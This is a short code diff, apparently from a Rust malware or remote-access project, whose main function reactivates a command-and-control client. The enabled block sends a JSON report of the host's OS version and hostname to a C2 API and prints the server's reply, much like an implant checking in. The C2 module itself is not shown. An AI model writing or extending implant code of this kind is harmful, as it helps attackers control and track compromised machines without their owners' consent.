@@ -1,12 +1,13 @@
 mod c2;
 mod encryption;
 mod system;
-//use serde_json::json;
+use serde_json::json;
 use std::{env, process::exit};
 
 #[tokio::main]
 async fn main() {
-    /* let c2 = c2::api::C2API::new();
+    
+    let c2 = c2::api::C2API::new();
     let body = json!({
         "versionOS": "Windows 10",
         "hosts": "WIN10254",
@@ -19,8 +20,6 @@ async fn main() {
         println!("Error: {}", api_res["error"]["errorMsg"])
     }
     println!("{}", api_res["data"]);
-
-    exit(0); */
 
     let args: Vec<String> = env::args().collect();
     if args.len() < 2 {
